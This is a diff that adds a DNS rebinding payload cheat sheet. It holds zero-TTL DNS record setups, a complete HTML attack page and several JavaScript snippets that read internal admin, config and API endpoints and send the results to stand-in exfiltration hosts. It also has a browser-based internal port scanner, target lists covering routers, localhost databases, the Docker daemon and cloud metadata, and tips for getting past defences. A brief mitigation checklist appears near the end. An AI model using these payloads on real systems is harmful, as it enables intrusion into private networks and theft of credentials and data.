@@ -1,0 +1,319 @@
+# DNS Rebinding Payloads
+
+## ========================================
+## BASIC DNS REBINDING
+## ========================================
+
+# Concept: Domain resolves to attacker IP first, then victim IP
+# 1. victim visits attacker.com (resolves to attacker IP)
+# 2. Browser caches, loads malicious JavaScript
+# 3. DNS changes to resolve to internal IP (192.168.1.1)
+# 4. JavaScript makes requests to "attacker.com" (now internal IP)
+
+## ========================================
+## DNS REBINDING SETUP
+## ========================================
+
+# DNS server configuration
+# Initial query: attacker.com -> 203.0.113.10 (attacker)
+# TTL: 0 seconds
+# Second query: attacker.com -> 192.168.1.1 (victim)
+
+# Example DNS responses
+attacker.com. 0 IN A 203.0.113.10   # First
+attacker.com. 0 IN A 192.168.1.1    # Second (rebind)
+
+## ========================================
+## ATTACK PAYLOADS
+## ========================================
+
+# JavaScript for DNS rebinding attack
+<script>
+function attack() {
+  // Wait for DNS rebind
+  setTimeout(function() {
+    fetch('http://attacker.com/admin')
+      .then(r => r.text())
+      .then(data => {
+        // Exfiltrate data
+        fetch('http://real-attacker.com/exfil', {
+          method: 'POST',
+          body: data
+        });
+      });
+  }, 5000); // Wait for TTL expiry
+}
+attack();
+</script>
+
+## ========================================
+## MULTI-STAGE REBINDING
+## ========================================
+
+# Stage 1: Load attacker's page
+http://attacker.com/index.html
+
+# Stage 2: Wait for DNS change
+setTimeout(() => {
+  // Now attacker.com resolves to 192.168.1.1
+  fetch('http://attacker.com:8080/api')
+}, 10000);
+
+## ========================================
+## TARGET INTERNAL SERVICES
+## ========================================
+
+# Router admin panel
+http://192.168.1.1
+http://192.168.0.1
+http://10.0.0.1
+
+# Internal APIs
+http://localhost:8080
+http://127.0.0.1:3000
+
+# Database interfaces
+http://localhost:5984  (CouchDB)
+http://localhost:27017 (MongoDB)
+http://localhost:9200  (Elasticsearch)
+
+# Docker daemon
+http://localhost:2375
+
+## ========================================
+## EXPLOITATION SCRIPT
+## ========================================
+
+# Complete rebinding attack
+<!DOCTYPE html>
+<html>
+<head>
+  <title>DNS Rebinding Attack</title>
+</head>
+<body>
+  <h1>Loading...</h1>
+  <script>
+    var rebindDelay = 5000;
+    var targetURL = 'http://attacker.com/admin/config';
+    
+    function waitForRebind() {
+      return new Promise(resolve => {
+        setTimeout(resolve, rebindDelay);
+      });
+    }
+    
+    async function attack() {
+      // Wait for DNS to rebind
+      await waitForRebind();
+      
+      try {
+        // Now requests go to internal IP
+        const response = await fetch(targetURL);
+        const data = await response.text();
+        
+        // Exfiltrate
+        await fetch('https://exfil.attacker.com/log', {
+          method: 'POST',
+          body: JSON.stringify({
+            url: targetURL,
+            data: data
+          })
+        });
+      } catch(e) {
+        console.error('Attack failed:', e);
+      }
+    }
+    
+    attack();
+  </script>
+</body>
+</html>
+
+## ========================================
+## TIME-BASED REBINDING
+## ========================================
+
+# Use very low TTL
+attacker.com. 0 IN A 203.0.113.10
+
+# After TTL expires, change to:
+attacker.com. 0 IN A 192.168.1.1
+
+## ========================================
+## MULTIPLE-ANSWER REBINDING
+## ========================================
+
+# Return both IPs, rely on browser behavior
+attacker.com. 0 IN A 203.0.113.10
+attacker.com. 0 IN A 192.168.1.1
+
+## ========================================
+## PORT SCANNING
+## ========================================
+
+# Scan internal network
+<script>
+async function scanPort(ip, port) {
+  const start = Date.now();
+  try {
+    await fetch(`http://${ip}:${port}`, {
+      mode: 'no-cors'
+    });
+    const time = Date.now() - start;
+    // Analyze timing
+    if (time < 1000) {
+      console.log(`Port ${port} open on ${ip}`);
+    }
+  } catch(e) {}
+}
+
+// After DNS rebind to internal IP
+for (let port = 80; port < 8080; port++) {
+  scanPort('attacker.com', port);
+}
+</script>
+
+## ========================================
+## BYPASS SAME-ORIGIN POLICY
+## ========================================
+
+# Read data from internal services
+fetch('http://attacker.com/api/secrets')
+  .then(r => r.json())
+  .then(secrets => {
+    // Send to attacker
+    navigator.sendBeacon('https://exfil.com/log', 
+      JSON.stringify(secrets));
+  });
+
+## ========================================
+## REBINDING TOOLS
+## ========================================
+
+# Singularity
+https://github.com/nccgroup/singularity
+- Automated DNS rebinding toolkit
+- Web interface for configuration
+
+# whonow
+https://github.com/brannondorsey/whonow
+- DNS rebinding server
+- Multiple strategies
+
+# rbndr
+https://github.com/taviso/rbndr
+- Simple DNS rebinding service
+
+## ========================================
+## DEFENSE BYPASS
+## ========================================
+
+# Bypass DNS pinning
+- Use multiple A records
+- Rapid TTL changes
+- HTTPS downgrade
+
+# Bypass host header validation
+Host: legitimate.com
+# DNS rebinds to internal IP
+
+## ========================================
+## ATTACK TARGETS
+## ========================================
+
+# Home routers
+http://192.168.1.1/admin
+http://192.168.0.1/setup
+
+# IoT devices
+http://192.168.1.100
+Cameras, thermostats, etc.
+
+# Development servers
+http://localhost:3000
+http://localhost:8080
+
+# Internal APIs
+http://internal-api.local
+
+## ========================================
+## EXPLOITATION EXAMPLES
+## ========================================
+
+# Example 1: Router configuration theft
+1. Victim visits http://evil.com
+2. evil.com resolves to attacker's server
+3. Serves malicious JavaScript
+4. DNS rebinds to 192.168.1.1
+5. JavaScript reads router config
+6. Exfiltrates to attacker
+
+# Example 2: Internal API access
+1. DNS rebinds to 127.0.0.1
+2. Access localhost services
+3. Steal tokens, data, credentials
+
+## ========================================
+## WEBSOCKET REBINDING
+## ========================================
+
+# WebSocket connections
+ws://attacker.com/socket
+# After rebind
+ws://192.168.1.1/admin-socket
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Setup DNS server with low TTL
+# 2. Create malicious page
+# 3. Configure DNS to change IPs
+# 4. Test with different timing
+# 5. Verify same-origin bypass
+
+## ========================================
+## REAL-WORLD SCENARIOS
+## ========================================
+
+# Scenario 1: Cloud metadata access
+- Rebind to 169.254.169.254
+- Access AWS/GCP metadata
+- Steal credentials
+
+# Scenario 2: Docker daemon access
+- Rebind to localhost:2375
+- Control Docker containers
+- Execute commands
+
+# Scenario 3: Database access
+- Rebind to localhost:27017
+- Access MongoDB
+- Extract data
+
+## ========================================
+## MITIGATION TESTING
+## ========================================
+
+# Check DNS pinning
+Does browser re-resolve DNS?
+
+# Check Host header validation
+Can internal IPs be accessed?
+
+# Check CORS policies
+Are internal origins allowed?
+
+## ========================================
+## COMBINED ATTACKS
+## ========================================
+
+# DNS Rebinding + CSRF
+1. Rebind to internal admin panel
+2. Submit CSRF attack
+3. Change configurations
+
+# DNS Rebinding + XSS
+1. Rebind to vulnerable internal app
+2. Exploit XSS
+3. Steal session tokens
